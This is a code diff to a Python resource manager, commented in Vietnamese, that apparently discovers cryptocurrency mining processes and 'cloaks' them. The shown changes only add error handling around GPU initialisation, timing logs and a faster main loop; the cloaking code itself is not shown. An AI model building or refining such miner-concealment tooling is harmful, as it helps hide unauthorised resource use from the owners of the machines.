@@ -60,9 +60,15 @@ class SharedResourceManager:
 
     def initialize_nvml(self):
         if not self._nvml_init:
-            pynvml.nvmlInit()
-            self._nvml_init = True
-            self.logger.info("NVML đã được khởi tạo thành công.")
+            try:
+                # Optimized NVML initialization với timeout protection
+                self.logger.debug("Initializing NVML...")
+                pynvml.nvmlInit()
+                self._nvml_init = True
+                self.logger.info("NVML đã được khởi tạo thành công.")
+            except Exception as e:
+                self.logger.warning(f"NVML initialization failed: {e} - continuing without GPU support")
+                self._nvml_init = False
 
     def shutdown_nvml(self):
         if self._nvml_init:
@@ -350,25 +356,40 @@ class ResourceManager(IResourceManager):
 
     def start(self):
         self.logger.info("Bắt đầu khởi động ResourceManager (Chỉ cloaking, không restore)...")
+        start_time = time.time()
         try:
-            # Tạo resource managers
+            # Step 1: Tạo resource managers (optimized)
+            step_start = time.time()
+            self.logger.info("🔧 Step 1/5: Creating resource managers...")
             resource_managers = ResourceControlFactory.create_resource_managers(
                 config=self.config,
                 logger=self.logger
             )
             if not resource_managers:
                 raise RuntimeError("ResourceControlFactory trả về rỗng hoặc None.")
+            self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
 
-            # Tạo SharedResourceManager
+            # Step 2: Tạo SharedResourceManager với optimized NVML init
+            step_start = time.time()
+            self.logger.info("🔧 Step 2/5: Creating SharedResourceManager...")
             self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
+            self.logger.info(f"✅ Step 2 completed in {time.time() - step_start:.2f}s")
 
-            # Khám phá tiến trình một lần
+            # Step 3: Parallel discovery và cloak preparation
+            step_start = time.time()
+            self.logger.info("🔧 Step 3/5: Discovering mining processes...")
             self.discover_mining_processes()
+            self.logger.info(f"✅ Step 3 completed in {time.time() - step_start:.2f}s")
 
-            # Cloak tất cả ngay
+            # Step 4: Initial cloaking (optimized)
+            step_start = time.time()
+            self.logger.info("🔧 Step 4/5: Triggering initial cloaking...")
             self._trigger_initial_cloak_signal()
+            self.logger.info(f"✅ Step 4 completed in {time.time() - step_start:.2f}s")
 
-            # Tạo thread xử lý queue cloaking
+            # Step 5: Start worker threads
+            step_start = time.time()
+            self.logger.info("🔧 Step 5/5: Starting worker threads...")
             adjust_thread = threading.Thread(
                 target=self.process_resource_adjustments,
                 daemon=True,
@@ -376,11 +397,14 @@ class ResourceManager(IResourceManager):
             )
             adjust_thread.start()
             self.workers.append(adjust_thread)
+            self.logger.info(f"✅ Step 5 completed in {time.time() - step_start:.2f}s")
 
-            # Vòng lặp chính "giữ" chương trình, không làm gì thêm
-            self.logger.info("ResourceManager đã khởi động. Vào vòng lặp chính...")
+            total_time = time.time() - start_time
+            self.logger.info(f"✅ ResourceManager đã khởi động hoàn tất trong {total_time:.2f}s. Vào vòng lặp chính...")
+            
+            # Vòng lặp chính "giữ" chương trình với optimized sleep interval
             while not self._stop_flag:
-                time.sleep(5)
+                time.sleep(1)  # Giảm từ 5s xuống 1s để responsive hơn
 
             self.logger.info("ResourceManager kết thúc vòng lặp chính.")
         except Exception as e:
